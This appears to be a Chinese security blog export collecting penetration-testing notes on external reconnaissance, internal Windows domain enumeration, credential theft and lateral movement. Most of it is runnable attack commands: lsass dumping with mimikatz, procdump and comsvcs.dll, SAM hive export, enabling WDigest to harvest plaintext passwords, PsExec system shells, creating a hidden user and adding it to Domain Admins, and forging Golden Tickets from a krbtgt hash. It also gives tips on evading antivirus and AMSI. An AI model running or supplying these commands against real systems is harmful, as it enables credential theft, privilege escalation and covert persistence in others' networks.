<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># masscan 192.33.6.145 -p1-65535  --rate 1000 -oL ports</span><br><span class="line"></span><br><span class="line"># ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39;  | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39; | sed &#39;s&#x2F;^,,&#x2F;&#x2F;&#39;)</span><br><span class="line"></span><br><span class="line"># nmap -sV -p $ports 192.33.6.145</span><br></pre></td></tr></table></figure>







<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Zmap</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p>
<h3 id="网络空间搜索引擎-1"><a href="#网络空间搜索引擎-1" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>fofa，hunter</p>
<p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a></p>
<h3 id="浏览器插件-1"><a href="#浏览器插件-1" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>fofa-view</p>
<p>TCPIPUTILS</p>
<h3 id="端口利用"><a href="#端口利用" class="headerlink" title="端口利用"></a>端口利用</h3><p>copy的 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：21 服务：FTP&#x2F;TFTP&#x2F;VSFTPD 总结：爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</span><br><span class="line">端口：22 服务：ssh远程连接      总结：爆破&#x2F;openssh漏洞</span><br><span class="line">端口：23 服务：Telnet远程连接   总结：爆破&#x2F;嗅探&#x2F;弱口令</span><br><span class="line">端口：25 服务：SMTP邮件服务     总结：邮件伪造</span><br><span class="line">端口：53 服务：DNS域名解析系统   总结：域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</span><br><span class="line">端口：67&#x2F;68 服务：dhcp服务      总结：劫持&#x2F;欺骗</span><br><span class="line">端口：110 服务：pop3              总结：爆破&#x2F;嗅探</span><br><span class="line">端口：139 服务：Samba服务         总结：爆破&#x2F;未授权访问&#x2F;远程命令执行</span><br><span class="line">端口：143 服务：Imap协议         总结：爆破161SNMP协议爆破&#x2F;搜集目标内网信息</span><br><span class="line">端口：389 服务：Ldap目录访问协议 总结：注入&#x2F;未授权访问&#x2F;弱口令</span><br><span class="line">端口：445 服务：smb              总结：ms17-010&#x2F;端口溢出</span><br><span class="line">端口：512&#x2F;513&#x2F;514 服务：Linux Rexec服务 总结：爆破&#x2F;Rlogin登陆</span><br><span class="line">端口：873 服务：Rsync服务                 总结：文件上传&#x2F;未授权访问</span><br><span class="line">端口：1080 服务：socket                  总结：爆破</span><br><span class="line">端口：1352 服务：Lotus domino邮件服务   总结：爆破&#x2F;信息泄漏</span><br><span class="line">端口：1433 服务：mssql                  总结：爆破&#x2F;注入&#x2F;SA弱口令</span><br><span class="line">端口：1521 服务：oracle       总结：爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2049Nfs服务配置不当</span><br><span class="line">端口：2181 服务：zookeeper服务            总结：未授权访问</span><br><span class="line">端口：2375 服务：docker remote api    总结：未授权访问</span><br><span class="line">端口：3306 服务：mysql                 总结：爆破&#x2F;注入</span><br><span class="line">端口：3389 服务：Rdp远程桌面链接        总结：爆破&#x2F;shift后门</span><br><span class="line">端口：4848 服务：GlassFish控制台       总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：5000 服务：sybase&#x2F;DB2数据库      总结：爆破&#x2F;注入&#x2F;提权</span><br><span class="line">端口：5432 服务：postgresql             总结：爆破&#x2F;注入&#x2F;缓冲区溢出</span><br><span class="line">端口：5632 服务：pcanywhere服务        总结：抓密码&#x2F;代码执行</span><br><span class="line">端口：5900 服务：vnc                     总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：6379 服务：Redis数据库           总结：未授权访问&#x2F;爆破</span><br><span class="line">端口：7001&#x2F;7002 服务：weblogic         总结：java反序列化&#x2F;控制台弱口令</span><br><span class="line">端口：80&#x2F;443 服务：http&#x2F;https         总结：web应用漏洞&#x2F;心脏滴血</span><br><span class="line">端口：8069 服务：zabbix服务            总结：远程命令执行&#x2F;注入</span><br><span class="line">端口：8161 服务：activemq             总结：弱口令&#x2F;写文件</span><br><span class="line">端口：8080&#x2F;8089 服务：Jboss&#x2F;Tomcat&#x2F;Resin 总结：爆破&#x2F;PUT文件上传&#x2F;反序列化</span><br><span class="line">端口：8083&#x2F;8086 服务：influxDB         总结：未授权访问</span><br><span class="line">端口：9000 服务：fastcgi                 总结：远程命令执行</span><br><span class="line">端口：9090 服务：Websphere             总结：控制台爆破&#x2F;java反序列化&#x2F;弱口令</span><br><span class="line">端口：9200&#x2F;9300 服务：elasticsearch   总结：远程代码执行</span><br><span class="line">端口：11211 服务：memcached             总结：未授权访问</span><br><span class="line">端口：27017&#x2F;27018 服务：mongodb         总结：未授权访问&#x2F;爆破</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h3 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h3><p>潮汐  <a href="http://finger.tidesec.com/">TideFinger 潮汐指纹 TideFinger 潮汐指纹 (tidesec.com)</a></p>
<p>云溪  (<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a>)   收费</p>
<p><a href="http://whatweb.bugscaner.com/look/">在线指纹识别,在线cms识别小插件–在线工具 (bugscaner.com)</a></p>
<p><a href="https://fp.shuziguanxing.com/#/">指纹收录平台 (shuziguanxing.com)</a></p>
<h3 id="github工具"><a href="#github工具" class="headerlink" title="github工具"></a>github工具</h3><p>WhatWeb</p>
<p><a href="https://github.com/TideSec/TideFinger">TideFinger</a></p>
<p><a href="https://github.com/Tuhinshubhra/CMSeeK">Tuhinshubhra/CMSeeK: CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs (github.com)</a></p>
<p><a href="https://github.com/Lucifer1993/AngelSword">Lucifer1993/AngelSword: Python3编写的CMS漏洞检测框架 (github.com)</a></p>
<h3 id="浏览器插件-2"><a href="#浏览器插件-2" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Wappalyzer</p>
<h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h3 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h3><p>wafw00f</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<h3 id="google-hack语法"><a href="#google-hack语法" class="headerlink" title="google hack语法"></a>google hack语法</h3><p>site:xxx.com intext:管理</p>
<p>site:xxx.com inurl:login/admin</p>
<p>site:xxx.com intitle:后台</p>
<p>site:xxx.com filetype:文件的格式 </p>
<h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>JSFinder</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git</span><br></pre></td></tr></table></figure>



<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/domestic.html">https://qftm.github.io/Information_Collection_Handbook/exploit-database/domestic.html</a></p>
<p><a href="https://qftm.github.io/Information_Collection_Handbook/exploit-database/foreign.html">https://qftm.github.io/Information_Collection_Handbook/exploit-database/foreign.html</a></p>
<p>参考</p>
<p><a href="https://github.com/Qftm/Information_Collection_Handbook">https://github.com/Qftm/Information_Collection_Handbook</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>ipconfig /all</p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554" style="zoom:150%;">



<p>net  user</p>
<p>net localgroup administrators </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621095850.png" alt="20210621095850" style="zoom:150%;">

<p>wmic product get name,version </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332">

<p>powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,Version” </p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357">



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621101825.png" alt="20210621101825"></p>
<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112046.png" alt="20210621112046" style="zoom:150%;">



<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,255) do @ping -w 2 -n 1 192.168.119.%i | findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220325145246713.png" alt="image-20220325145246713"></p>
<h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qusery process 显示活动的后台进程信息</span><br><span class="line"></span><br><span class="line">query Session   查询建立的session连接</span><br><span class="line"></span><br><span class="line">query user  显示有关登录到系统的所有用户的信息</span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220326143716341.png" alt="image-20220326143716341"></p>
<h2 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621103820.png" alt="20210621103820"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104756.png" alt="20210621104756"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104813.png" alt="20210621104813"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104834.png" alt="20210621104834"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621105024.png" alt="20210621105024"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621111006.png" alt="20210621111006"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112521.png" alt="20210621112521"></p>
<h4 id="查询域内的SPN。"><a href="#查询域内的SPN。" class="headerlink" title="查询域内的SPN。"></a>查询域内的SPN。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
<p>参考：</p>
<p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
<p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
<p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
<p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack$ 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack$ &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网抓hash/密码</title>
    <url>/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</url>
    <content><![CDATA[<h1 id="1mimikatz"><a href="#1mimikatz" class="headerlink" title="1mimikatz"></a>1mimikatz</h1><p>只需要管理员权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
<p>可分为两步：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure>

 <span id="more"></span>



<h1 id="2各种dump-mimikatz"><a href="#2各种dump-mimikatz" class="headerlink" title="2各种dump+mimikatz"></a>2各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
<p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会），我感觉应该在wdf白名单路径下进行转储</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>(Windows自带)     原理是通过API MiniDumpWriteDump，利用comsvcs.dll导出 函数 minidump 进行dump内存</p>
<p>条件：开启SeDebugPrivilege权限 （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
<p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>

<p>但要绕过AMSI</p>
<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p>
<p>重要问题：绕过杀软</p>
<p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
<p>powershell下  火绒不报，</p>
<p><a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">免杀转储lsass进程技巧 (qq.com)</a></p>
<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>



<h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper"></a>SqlDumper</h3><h1 id="3导出本地SAM-mimikatz"><a href="#3导出本地SAM-mimikatz" class="headerlink" title="3导出本地SAM+mimikatz"></a>3导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>

<p>mimikatz读取即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
<h1 id="rdp明文凭据"><a href="#rdp明文凭据" class="headerlink" title="rdp明文凭据"></a>rdp明文凭据</h1><p>参考:<a href="https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/">https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/</a></p>
<p>(<a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dum">https://loong716.top/posts/lsass/#2-签名白名单文件dum</a></p>
<h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
<li>winserver2012以后只能抓到用户hash，抓不到明文</li>
</ol>
<p>但可以通过修改注册表<strong>开启Wdigest Auth</strong>，然后cmd执行强制锁频（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>mimikatz要免杀，有杀软一定要绕，不然会暴露</li>
</ol>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网抓hash/密码</tag>
      </tags>
  </entry>
  <entry>
    <title>内网横向渗透</title>
    <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>不断更新</p>
<p>配合impacket工具使用</p>
<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
<p>利用条件：</p>
<ol>
<li>开放139,445端口</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>



<span id="more"></span>



<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>



<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
<p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
<p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
<p>需要条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 需要伪造的域用户名（有域管，肯定伪造域管啦）</span><br><span class="line"></span><br><span class="line">2. 该域的域名</span><br><span class="line"></span><br><span class="line">3. krbtgt的ntml hash或者AES-256值</span><br><span class="line"></span><br><span class="line">4. 域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</span><br></pre></td></tr></table></figure>

<p>获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</p>
<ol>
<li>获得hash等需要的条件信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:shmily.god &#x2F;user:krbtgt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225230207.png" alt="image-20220307225230207"></p>
<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225631024.png" alt="image-20220307225631024"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SID        :S-1-5-21-2538459943-234226500-22795540782</span><br><span class="line">ntml hash  :8aecb1498df128a866968668302003bd</span><br><span class="line">aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查询域管理员账号：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308000619676.png" alt="image-20220308000619676"></p>
<p>注入票据前</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.119.200\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308004612176.png" alt="image-20220308004612176"></p>
<ol start="3">
<li>清空会话票据</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308001049876.png" alt="image-20220308001049876"></p>
<ol start="4">
<li>生成黄金票据(Administrator.kiribi)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:shmily.god &#x2F;sid:S-1-5-21-2538459943-234226500-22795540782 &#x2F;krbtgt:8aecb1498df128a866968668302003bd &#x2F;ticket:Administrator.kiribi</span><br><span class="line"></span><br><span class="line"># kerberos::golden &#x2F;user:要伪造的域用户(我们这一般写域管理员) &#x2F;domain:域名 &#x2F;sid:域的sid值 &#x2F;krbtgt:krbtgt的哈希 &#x2F;ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002554785.png" alt="image-20220308002554785"></p>
<ol start="5">
<li>注入票据</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002722245.png" alt="image-20220308002722245"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::tgt  查看当前票据</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002904106.png" alt="image-20220308002904106"></p>
<ol start="6">
<li>验证</li>
</ol>
<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308003825467.png" alt="image-20220308003825467"></p>
<p>使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</p>
<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307220404812.png" alt="image-20220307220404812"></p>
